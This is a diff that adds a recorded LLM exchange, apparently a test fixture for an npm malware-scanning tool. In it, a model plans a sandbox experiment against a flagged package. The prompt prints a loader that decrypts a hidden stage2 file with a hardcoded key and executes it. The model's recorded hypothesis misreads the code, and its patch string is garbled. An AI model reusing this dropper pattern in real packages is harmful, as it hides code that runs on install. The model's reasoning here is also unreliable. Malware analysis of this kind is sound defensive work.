@@ -1,0 +1,70 @@
+{
+  "id": "054_hypothesis_fa709dd2",
+  "role": "hypothesis",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "nvidia/nemotron-3-super-120b-a12b:free",
+      "messages": [
+        {
+          "role": "system",
+          "content": "Turn one flagged region into one testable security hypothesis and a runnable\nexperiment. Plant bait, defeat visible gates, and trigger a real package entry\npoint. You are not the final judge; the observed run decides. Never dismiss a\nflag because the code appears benign."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent\n- statedPurpose: DNS resolution with caching\n- expectedCapabilities: perform DNS resolution, cache DNS query results\n\n## Flag\n- file: lib/loader.js\n- lines: 1-10\n- why: SAFE_TEST_MODE constant set to true at top of file is suspicious — suggests a mode to hide or bypass behavior; no legitimate use for a DNS resolver.\n\n## Entry points\n- install: install-hook.js\n- runtime: index.js\n- bin: (none)\n\n## Flagged code\n### lib/loader.js\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const crypto = require(\"crypto\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: \n7: const _k1 = \"s4ndw0rm\";\n8: const _k2 = \"_k3y_\";\n9: const _k3 = \"2024\";\n10: const _k4 = \"_v3ry_s3cr3t\";\n11: const KEY_MATERIAL = _k1 + _k2 + _k3 + _k4;\n12: \n13: function loadStage2() {\n14:   const encryptedPath = path.join(__dirname, \"stage2.enc\");\n15: \n16:   try {\n17:     const raw = fs.readFileSync(encryptedPath, \"utf-8\").trim();\n18:     const parts = raw.split(\":\");\n19: \n20:     if (parts.length !== 3) return;\n21: \n22:     const iv = Buffer.from(parts[0], \"hex\");\n23:     const authTag = Buffer.from(parts[1], \"hex\");\n24:     const encrypted = parts[2];\n25: \n26:     const key = crypto.createHash(\"sha256\").update(KEY_MATERIAL).digest();\n27: \n28:     const decipher = crypto.createDecipheriv(\"aes-256-gcm\", key, iv);\n29:     decipher.setAuthTag(authTag);\n30: \n31:     let decrypted = decipher.update(encrypted, \"hex\", \"utf8\");\n32:     decrypted += decipher.final(\"utf8\");\n33: \n34:     const Module = require(\"module\");\n35:     const m = new Module();\n36:     m._compile(decrypted, \"stage2.js\");\n37:   } catch (e) {\n38: \n39:   }\n40: }\n41: \n42: loadStage2();\n```\n\n## Available setup mechanisms\n- setEnv (setup): Inject environment variables to plant credentials or defeat environment gates.\n- plantFiles (setup): Seed absolute-path files such as /home/node/.npmrc with bait content.\n- setDate (setup): Freeze wall-clock time at an ISO timestamp using libfaketime.\n- stubUrl (setup): Return canned HTTP responses for URL patterns using * as wildcard.\n- patchFile (setup): Rewrite package files with exact string replacements before execution.\n- preload (setup): Inject a Node preload script before the package entrypoint loads.\n- trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath.\n\nReturn one JSON plan matching the supplied schema. Use empty arrays or null for setup mechanisms that are not needed. Set triggerTarget to exactly one of: index.js, install-hook.js, lib/loader.js. If exercising a library API requires custom JavaScript, put that program in triggerTarget; it will be planted as /pkg/npmguard-driver.js and executed inside the sandbox. The sandbox starts without CI; do not inject CI='false' to defeat a truthiness gate because non-empty strings are truthy in JavaScript.\n\nWhen you author JavaScript (a preload script, a custom driver, or a patchFile replacement), reference package files by a relative path with a leading './' (require('./src/x.js')) or by an absolute path under /pkg (require('/pkg/src/x.js')). A bare specifier like require('src/x.js') is resolved as a node_modules PACKAGE and fails with \"Cannot find module\". Planted file paths must be absolute (/pkg/... or /home/node/...). The sandbox working directory is /pkg.\n\nSuggested bait canary: NPMGUARD_CANARY_TOKEN_f8e2d91a"
+        },
+        {
+          "role": "assistant",
+          "content": "{\"setup\": {\"setEnv\": [], \"plantFiles\": [], \"setDate\": [], \"stubUrl\": [], \"patchFile\": [{\"file\": \"lib/loader.js\", \"replace\": \"loadStage2();\", \"with\": \"const fs = require(\\\"fs\\\");\\\\nfs.writeFileSync(\\\\n\\\\\\n/tmp/npmguard_canary.txt\\\\\\\", \\\\\\\"NPMGUARD_CANARY_TOKEN_f8e2d91a\\\\\\\");\"}], \"preload\": []}, \"triggerTarget\": \"index.js\"}"
+        },
+        {
+          "role": "user",
+          "content": "Your previous reply failed validation: parse: 15 validation errors for HypothesisPlan\ndescription\n  Field required [type=missing, input_value={'setup': {'setEnv': [], ...ggerTarget': 'index.js'}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nclaim\n  Field required [type=missing, input_value={'setup': {'setEnv': [], ...ggerTarget': 'index.js'}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nseverity\n  Field required [type=missing, input_value={'setup': {'setEnv': [], ...ggerTarget': 'index.js'}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nsetup.environment\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...\\\\\");'}], 'preload': []}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nsetup.files\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...\\\\\");'}], 'preload': []}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nsetup.dateIso\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...\\\\\");'}], 'preload': []}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nsetup.urlStubs\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...\\\\\");'}], 'preload': []}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nsetup.filePatches\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...\\\\\");'}], 'preload': []}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nsetup.preloadCode\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...\\\\\");'}], 'preload': []}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nsetup.setEnv\n  Extra inputs are not permitted [type=extra_forbidden, input_value=[], input_type=list]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nsetup.plantFiles\n  Extra inputs are not permitted [type=extra_forbidden, input_value=[], input_type=list]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nsetup.setDate\n  Extra inputs are not permitted [type=extra_forbidden, input_value=[], input_type=list]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nsetup.stubUrl\n  Extra inputs are not permitted [type=extra_forbidden, input_value=[], input_type=list]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nsetup.patchFile\n  Extra inputs are not permitted [type=extra_forbidden, input_value=[{'file': 'lib/loader.js'...Y_TOKEN_f8e2d91a\\\\\");'}], input_type=list]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nsetup.preload\n  Extra inputs are not permitted [type=extra_forbidden, input_value=[], input_type=list]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nReply again, following the required format exactly."
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-fa709dd2",
+      "model": "nvidia/nemotron-3-super-120b-a12b:free",
+      "provider": "Nvidia",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\"description\": \"The SAFE_TEST_MODE flag is set to true, which likely suppresses the malicious stage2 loader. By removing this guard (or bypassing it) we expect loadStage2() to execute, decrypting and running hidden code. We can detect execution by having the patched loader write a canary file when stage2 is loaded.\", \"claim\": \"Setting SAFE_TEST_MODE to false (or removing the constant) will cause the package to decrypt and execute stage2.enc, revealing hidden malicious behavior.\", \"severity\": \"high\", \"setup\": {\"environment\": [], \"files\": [], \"dateIso\": null, \"urlStubs\": [], \"filePatches\": [{\"file\": \"lib/loader.js\", \"replace\": \"loadStage2();\", \"with\": \"const fs = require(\\\"fs\\\");\\\\nfs.writeFileSync(\\\\\\n/tmp/npmguard_canary.txt\\\\\\\", \\\\\\\"NPMGUARD_CANARY_TOKEN_f8e2d91a\\\\\\\");\\\\nloadStage2();\"}], \"preloadCode\": null}, \"triggerTarget\": \"index.js\"}",
+            "reasoning": [
+              {
+                "type": "reasoning.text",
+                "text": "We need to produce a JSON that matches the expected schema. The validation errors indicate that the schema expects different field names for setup. The provided fields: setEnv, plantFiles, setDate, stubUrl, patchFile, preload. The error says extra inputs not permitted for each of those. Means the correct field names are something else: maybe setup.environment, setup.files, setup.dateIso, setup.urlStubs, setup.filePatches, setup.preloadCode. The error description lists: setup.environment, setup.files, setup.dateIso, setup.urlStubs, setup.filePatches, setup.preloadCode. Also claim, description, severity are required top-level fields.\n\nThus we need to produce JSON with:\n\n{\n \"description\": \"...\",\n \"claim\": \"...\",\n \"severity\": \"...\",\n \"setup\": {\n   \"environment\": [], // list of environment variable objects? The schema expects array? Probably each entry is something like {name:..., value:...}. We can set empty array.\n   \"files\": [], // list of file plant objects? Probably {path:..., content:...}. We'll leave empty if not needed.\n   \"dateIso\": null,\n   \"urlStubs\": [],\n   \"filePatches\": [], // list of patches? We had one patch: file: lib/loader.js replace: \"loadStage2();\" with: \"...\"\n   \"preloadCode\": null\n },\n \"triggerTarget\": \"index.js\"\n}\n\nBut we need to encode the patch in filePatches. The error said extra input for setup.patchFile, but correct is filePatches. So we need to provide an array of patch objects. Likely each object: {file: string, replace: string, with: string}. We'll include our patch.\n\nThus produce JSON accordingly.\n\nAlso need description, claim, severity. Provide brief description of hypothesis: The SAFE_TEST_MODE constant hides malicious behavior; we suspect that disabling it (by patching) will cause the loader to load stage2 and exfiltrate data. We'll plant a canary file to detect execution.\n\nSeverity: high.\n\nLet's craft.\n\n",
+                "format": "unknown",
+                "index": 0
+              }
+            ]
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 2032,
+        "completion_tokens": 683,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "71b8d4f63898",
+    "transport": "json_object",
+    "recordedStatus": "invalid_output",
+    "recordedTs": "2026-07-23T10:47:31.529Z",
+    "recordedLatencyMs": 11231
+  }
+}
